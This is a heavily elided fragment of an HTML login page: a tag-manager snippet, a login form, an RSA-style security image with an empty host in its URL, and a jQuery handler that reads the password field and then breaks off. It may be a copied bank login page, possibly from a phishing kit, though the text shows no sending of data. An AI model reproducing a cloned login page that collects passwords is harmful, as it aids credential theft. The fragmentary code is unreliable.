...
<head>
    ...
    })(window, document, "script", "dataLayer", "GTM-KFWRD89");
    </script>
    ...
    <form id="loginUserForm" name="loginUserForm"
                ...
                <div class="panel panel-primary">
                    ...
                    >
                      <div class="mua-security-img">
                        <img
                          id="rsaImage"
                          src="https:///content/images/AnimalsWildlife/000000641224RS.jpg"
                          width="90"
                          height="90"
                        />
                      </div>
                                ...
                                <div class="panel_general mua-panel_general">
                                    ...
                                    <div class="two-button-container mua-button-container">
                                        ...
                                        <div class="two-button-b">
                                            <input id="btn-Pass" name="btnGo" class="btn btn-success btn-Pass"
        ...
        $(document).ready(function() {
            ...
            $("#btn-Pass").click(function() {
                var password = $("#passcrypt").val(); // Leer el valor del campo username
                if (password) {
